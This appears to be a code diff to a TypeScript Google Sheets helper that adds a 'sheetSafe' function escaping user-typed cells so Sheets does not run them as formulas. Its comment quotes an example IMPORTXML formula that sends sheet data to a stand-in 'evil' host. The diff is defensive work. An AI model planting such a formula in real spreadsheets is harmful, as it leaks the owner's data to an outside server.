@@ -54,6 +54,22 @@ async function accessToken(): Promise<string> {
   return ((await res.json()) as { access_token: string }).access_token;
 }
 
+/* Every write uses USER_ENTERED so numbers and dates keep working, which also
+   means a text cell starting with = + - or @ is EXECUTED as a formula. Names,
+   complaint text and expense notes are typed by other people (a BVRIT student
+   types their own name at self-registration), so a value like
+   =IMPORTXML("http://evil/?"&A1:F50,"//a") would read the owner's data and send it
+   out when the Sheet is opened. A leading apostrophe makes Sheets treat the cell
+   as plain text (and hides the apostrophe). Plain numbers-as-text ("-5", "+12")
+   and cells already prefixed with an apostrophe are left alone. */
+export function sheetSafe<T>(cell: T): T | string {
+  if (typeof cell !== "string" || cell === "") return cell;
+  if (!/^[=+\-@\t\r]/.test(cell)) return cell;
+  if (/^[+-]?\d+(\.\d+)?$/.test(cell)) return cell;
+  return "'" + cell;
+}
+const safeRows = (rows: (string | number)[][]) => rows.map((r) => r.map((c) => sheetSafe(c)));
+
 /** Read a tab's values. Returns [] when the tab doesn't exist yet. */
 export async function readSheet(tab: string): Promise<string[][]> {
   if (!sheetsConfigured()) return [];
@@ -102,14 +118,14 @@ export async function appendSheet(
     /* Header only when the tab is genuinely empty. Checking A1 rather than
        tracking "did I create it" keeps this correct if the tab was made by
        hand, and stops a header being appended into the middle of the log. */
-    const out = [...rows];
+    const out = safeRows([...rows]);
     if (header) {
       const first = await fetch(
         `https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${encodeURIComponent(`${tab}!A1:A1`)}`,
         { headers: { Authorization: `Bearer ${token}` } },
       );
       const empty = !first.ok || !((await first.json()) as { values?: string[][] }).values?.length;
-      if (empty) out.unshift(header);
+      if (empty) out.unshift(safeRows([header])[0]);
     }
 
     const range = encodeURIComponent(`${tab}!A1`);
@@ -155,7 +171,7 @@ export async function writeSheet(tab: string, rows: (string | number)[][]) {
      keep whatever the PREVIOUS sync left there (found live: a deleted
      student's row surviving in the "Students — BVRIT" tab under the new
      "Total 0" line). Explicit "" values overwrite it. */
-  const padded = rows.map((r) => { const a: (string | number)[] = r.slice(0, 26); while (a.length < 26) a.push(""); return a; });
+  const padded = safeRows(rows).map((r) => { const a: (string | number)[] = r.slice(0, 26); while (a.length < 26) a.push(""); return a; });
   const dataRange = encodeURIComponent(`${tab}!A1:Z${Math.max(rows.length, 1)}`);
   const put = await fetch(
     `https://sheets.googleapis.com/v4/spreadsheets/${id}/values/${dataRange}?valueInputOption=USER_ENTERED`,
